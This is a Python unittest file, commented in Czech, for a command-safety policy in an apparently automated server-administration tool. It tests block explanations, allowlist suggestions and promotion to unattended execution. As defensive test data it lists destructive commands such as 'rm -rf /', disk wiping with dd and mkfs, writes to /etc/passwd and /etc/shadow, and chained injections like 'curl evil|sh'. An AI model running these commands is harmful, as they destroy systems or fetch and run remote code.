"""487/490: Vysvětlení bloku a návrh pravidla do allowlistu.

Bezpečnostní jádro:
  - alternativa se bere z allowlistu / read-only simulace, nikdy se
    negeneruje → nesmí se stát cestou k obejití zákazu
  - pravidlo do allowlistu je jen NÁVRH a nesmí vzniknout pro rizikový
    příkaz ani pro něco, co už povolené je
"""
import os
import sys
import unittest

_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from sentinel import policy, safety

ALLOWLIST = [
    {'pattern': 'systemctl status *', 'description': 'stav služby'},
    {'pattern': 'df -h', 'description': 'zaplnění disku'},
    {'pattern': 'journalctl -u * -n 50', 'description': 'log služby'},
]


class TestBinary(unittest.TestCase):
    def test_plain(self):
        self.assertEqual(policy._binary('df -h'), 'df')

    def test_sudo_stripped(self):
        self.assertEqual(policy._binary('sudo -n systemctl restart x'), 'systemctl')

    def test_path_stripped(self):
        self.assertEqual(policy._binary('/usr/bin/systemctl status x'), 'systemctl')

    def test_empty(self):
        for v in ('', None, '   '):
            self.assertEqual(policy._binary(v), '')


class TestExplainBlock(unittest.TestCase):
    def test_allowed_command_not_blocked(self):
        r = policy.explain_block('df -h', safety, ALLOWLIST)
        self.assertFalse(r['blocked'])
        self.assertTrue(r['in_allowlist'])

    def test_glob_match_recognised(self):
        r = policy.explain_block('systemctl status nginx', safety, ALLOWLIST)
        self.assertTrue(r['in_allowlist'])
        self.assertFalse(r['blocked'])

    def test_not_in_allowlist_is_blocked(self):
        r = policy.explain_block('systemctl restart nginx', safety, ALLOWLIST)
        self.assertTrue(r['blocked'])
        self.assertFalse(r['in_allowlist'])
        self.assertIn('allowlist', r['hint'].lower())

    def test_high_risk_blocked_even_if_pattern_would_match(self):
        """Rizikový příkaz nesmí projít jen proto, že ho někdo dal do allowlistu."""
        evil = [{'pattern': 'rm -rf /', 'description': 'nesmysl'}]
        r = policy.explain_block('rm -rf /', safety, evil)
        self.assertTrue(r['blocked'])
        self.assertGreaterEqual(r['risk_score'], safety.THRESHOLD_BLOCK)

    def test_shell_meta_not_matched_by_glob(self):
        """Rozšíření příkazu o && nesmí projít přes glob pravidlo."""
        r = policy.explain_block('systemctl status nginx && curl evil|sh',
                                 safety, ALLOWLIST)
        self.assertFalse(r['in_allowlist'])
        self.assertTrue(r['blocked'])

    def test_reasons_present_for_risky(self):
        r = policy.explain_block('rm -rf /var/lib', safety, ALLOWLIST)
        self.assertTrue(r['reasons'])

    def test_empty_command(self):
        r = policy.explain_block('', safety, ALLOWLIST)
        self.assertTrue(r['blocked'])
        self.assertEqual(r['risk_score'], 100)

    def test_no_allowlist_does_not_crash(self):
        for rules in (None, []):
            self.assertTrue(policy.explain_block('df -h', safety, rules)['blocked'])


class TestAlternativesAreSafe(unittest.TestCase):
    """Alternativa nesmí být návod, jak zákaz obejít."""

    def test_alternatives_come_from_allowlist_or_preview(self):
        r = policy.explain_block('systemctl restart nginx', safety, ALLOWLIST)
        self.assertTrue(r['alternatives'])
        for alt in r['alternatives']:
            self.assertIn(alt['kind'], ('read_only_preview', 'allowlisted'))

    def test_allowlisted_alternatives_are_real_patterns(self):
        r = policy.explain_block('systemctl restart nginx', safety, ALLOWLIST)
        patterns = {x['pattern'] for x in ALLOWLIST}
        for alt in r['alternatives']:
            if alt['kind'] == 'allowlisted':
                self.assertIn(alt['command'], patterns)

    def test_no_alternative_exceeds_block_threshold(self):
        for cmd in ('systemctl restart nginx', 'kill 1234', 'iptables -F'):
            r = policy.explain_block(cmd, safety, ALLOWLIST)
            for alt in r['alternatives']:
                score, _ = safety.classify(alt['command'])
                self.assertLess(score, safety.THRESHOLD_BLOCK,
                                f"{cmd} → nabídnuto rizikové {alt['command']}")

    def test_alternatives_capped(self):
        big = [{'pattern': f'systemctl x{i}', 'description': 'd'} for i in range(50)]
        self.assertLessEqual(len(policy.explain_block('systemctl restart x', safety, big)['alternatives']), 6)


class TestExtractCommand(unittest.TestCase):
    def test_from_json_response(self):
        e = {'response': '{"command": "df -h", "description": "disk"}'}
        self.assertEqual(policy._extract_command(e), 'df -h')

    def test_escaped_quotes(self):
        e = {'response': '{"command": "echo \\"ahoj\\"", "description": "x"}'}
        self.assertEqual(policy._extract_command(e), 'echo "ahoj"')

    def test_na_ignored(self):
        self.assertEqual(policy._extract_command({'response': '{"command": "N/A"}'}), '')

    def test_no_command_field(self):
        self.assertEqual(policy._extract_command({'response': 'jen text'}), '')

    def test_malformed_input(self):
        for bad in (None, {}, {'response': None}, 123):
            self.assertIsInstance(policy._extract_command(bad), str)


def audit(cmd, n=1):
    return [{'response': '{"command": "%s", "description": "d"}' % cmd} for _ in range(n)]


class TestSuggestAllowlistRules(unittest.TestCase):
    def test_repeated_safe_command_suggested(self):
        s = policy.suggest_allowlist_rules(audit('uptime', 3), ALLOWLIST, safety)
        self.assertEqual(len(s), 1)
        self.assertEqual(s[0]['command'], 'uptime')
        self.assertEqual(s[0]['times_suggested'], 3)

    def test_below_threshold_not_suggested(self):
        self.assertEqual(policy.suggest_allowlist_rules(audit('uptime', 2), ALLOWLIST, safety), [])

    def test_already_allowed_not_suggested(self):
        self.assertEqual(policy.suggest_allowlist_rules(audit('df -h', 9), ALLOWLIST, safety), [])

    def test_already_allowed_via_glob_not_suggested(self):
        self.assertEqual(
            policy.suggest_allowlist_rules(audit('systemctl status nginx', 9), ALLOWLIST, safety), [])

    def test_risky_command_never_suggested(self):
        """I stokrát navržený rizikový příkaz zůstává na ručním schválení.

        `rm -rf /var` dostane od klasifikátoru skóre 25 — kdyby laťkou bylo
        „nízké skóre", prošel by. Proto se navíc vyžaduje read-only.
        """
        for cmd in ('rm -rf /var', 'dd if=/dev/zero of=/dev/sda', 'mkfs.ext4 /dev/sda1',
                    'systemctl restart nginx', 'kill -9 1234', 'iptables -F',
                    'chmod 777 /etc/shadow', 'truncate -s 0 /var/log/syslog',
                    'apt-get -y remove openssh-server', 'reboot'):
            self.assertEqual(policy.suggest_allowlist_rules(audit(cmd, 50), ALLOWLIST, safety), [],
                             f"navrženo k bezobslužnému spouštění: {cmd}")

    def test_write_redirect_never_suggested(self):
        """Zápis do souboru není read-only, i když skóre vyjde nízké."""
        for cmd in ('echo x > /etc/hosts', 'cat a >> /etc/passwd', 'tee /etc/fstab'):
            self.assertEqual(policy.suggest_allowlist_rules(audit(cmd, 50), ALLOWLIST, safety), [],
                             f"navržen zápis: {cmd}")

    def test_proposed_pattern_is_exact_not_glob(self):
        """Glob by povolil i varianty, které nikdo neposoudil."""
        s = policy.suggest_allowlist_rules(audit('uptime', 5), ALLOWLIST, safety)
        self.assertEqual(s[0]['proposed_pattern'], 'uptime')
        self.assertNotIn('*', s[0]['proposed_pattern'])

    def test_sorted_by_frequency(self):
        entries = audit('uptime', 3) + audit('free -m', 7)
        s = policy.suggest_allowlist_rules(entries, ALLOWLIST, safety)
        self.assertEqual(s[0]['command'], 'free -m')

    def test_impact_mentions_sudo_for_root_tools(self):
        s = policy.suggest_allowlist_rules(audit('systemctl list-units', 5), [], safety)
        self.assertTrue(s)
        self.assertIn('sudo', s[0]['impact'])

    def test_impact_plain_for_userspace_tool(self):
        s = policy.suggest_allowlist_rules(audit('uptime', 5), ALLOWLIST, safety)
        self.assertNotIn('sudo', s[0]['impact'])

    def test_empty_audit(self):
        for e in (None, []):
            self.assertEqual(policy.suggest_allowlist_rules(e, ALLOWLIST, safety), [])

    def test_entries_without_command_ignored(self):
        self.assertEqual(
            policy.suggest_allowlist_rules([{'response': 'nic'}] * 10, ALLOWLIST, safety), [])


if __name__ == '__main__':
    unittest.main(verbosity=2)


def fix(cmd, status='worked', n=1):
    return [{'command': cmd, 'status': status} for _ in range(n)]


class TestSuggestAutoExecute(unittest.TestCase):
    """505: povýšení na bezobslužný běh podle prokázané úspěšnosti (486).

    Poslední místo, kde do smyčky vstupuje člověk — podmínky jsou schválně
    přísné a jakákoli pochybnost musí návrh zabít.
    """

    RULES = [
        {'id': 1, 'pattern': 'systemctl restart nginx', 'description': 'restart',
         'auto_execute': False},
        {'id': 2, 'pattern': 'df -h', 'description': 'disk', 'auto_execute': True},
    ]

    def test_proven_command_suggested(self):
        s = policy.suggest_auto_execute(fix('systemctl restart nginx', n=12),
                                        self.RULES, safety)
        self.assertEqual(len(s), 1)
        self.assertEqual(s[0]['successes'], 12)
        self.assertEqual(s[0]['rule_id'], 1)

    def test_below_threshold_not_suggested(self):
        n = policy.MIN_SUCCESSES_FOR_AUTO - 1
        self.assertEqual(
            policy.suggest_auto_execute(fix('systemctl restart nginx', n=n),
                                        self.RULES, safety), [])

    def test_single_failure_kills_trust(self):
        """Bezobslužný zásah, který občas nefunguje, je horší než žádný."""
        attempts = fix('systemctl restart nginx', n=50) + fix('systemctl restart nginx', 'failed')
        self.assertEqual(policy.suggest_auto_execute(attempts, self.RULES, safety), [])

    def test_uncertain_result_blocks(self):
        attempts = fix('systemctl restart nginx', n=50) + fix('systemctl restart nginx', 'uncertain')
        self.assertEqual(policy.suggest_auto_execute(attempts, self.RULES, safety), [])

    def test_pending_result_blocks(self):
        attempts = fix('systemctl restart nginx', n=50) + fix('systemctl restart nginx', 'pending')
        self.assertEqual(policy.suggest_auto_execute(attempts, self.RULES, safety), [])

    def test_command_not_in_allowlist_not_suggested(self):
        """Bez schváleného pravidla není co povyšovat."""
        self.assertEqual(
            policy.suggest_auto_execute(fix('systemctl restart neco-jineho', n=50),
                                        self.RULES, safety), [])

    def test_already_auto_not_suggested(self):
        self.assertEqual(policy.suggest_auto_execute(fix('df -h', n=50), self.RULES, safety), [])

    def test_risky_command_never_promoted(self):
        rules = [{'id': 9, 'pattern': 'rm -rf /var/log', 'auto_execute': False}]
        self.assertEqual(policy.suggest_auto_execute(fix('rm -rf /var/log', n=99),
                                                     rules, safety), [])

    def test_impact_states_evidence(self):
        s = policy.suggest_auto_execute(fix('systemctl restart nginx', n=11),
                                        self.RULES, safety)
        self.assertIn('11', s[0]['impact'])
        self.assertIn('0', s[0]['impact'])

    def test_sorted_by_successes(self):
        rules = self.RULES + [{'id': 3, 'pattern': 'systemctl restart sshd',
                               'auto_execute': False}]
        attempts = fix('systemctl restart nginx', n=11) + fix('systemctl restart sshd', n=30)
        s = policy.suggest_auto_execute(attempts, rules, safety)
        self.assertEqual(s[0]['command'], 'systemctl restart sshd')

    def test_empty_and_malformed(self):
        for a in (None, [], [None], [{}], [{'command': None}]):
            self.assertEqual(policy.suggest_auto_execute(a, self.RULES, safety), [])

    def test_destructive_tools_never_promoted_regardless_of_record(self):
        """Skóre nestačí: `rm -rf /var/log` má jen 25, tedy pod prahem REVIEW.
        Denylist nástrojů to musí zastavit i po 99 úspěších."""
        for cmd in ('rm -rf /var/log', 'dd if=/dev/zero of=/tmp/x', 'chmod 777 /srv',
                    'reboot', 'apt-get -y upgrade', 'iptables -F', 'mount /dev/sdb1 /mnt',
                    'truncate -s 0 /var/log/syslog', 'sysctl -w vm.swappiness=10'):
            rules = [{'id': 9, 'pattern': cmd, 'auto_execute': False}]
            self.assertEqual(policy.suggest_auto_execute(fix(cmd, n=99), rules, safety), [],
                             f"povýšeno k bezobslužnému běhu: {cmd}")

    def test_chained_command_never_promoted(self):
        """Řetězení mění dopad na něco, co nikdo neposoudil."""
        for cmd in ('systemctl restart nginx && curl x', 'df -h | sh',
                    'systemctl restart nginx; rm -rf /'):
            rules = [{'id': 9, 'pattern': cmd, 'auto_execute': False}]
            self.assertEqual(policy.suggest_auto_execute(fix(cmd, n=99), rules, safety), [], cmd)

    def test_legitimate_restart_still_promotable(self):
        """Přitvrzení nesmí zabít smysl funkce."""
        rules = [{'id': 1, 'pattern': 'systemctl restart nginx', 'auto_execute': False}]
        self.assertTrue(policy.suggest_auto_execute(fix('systemctl restart nginx', n=12),
                                                    rules, safety))
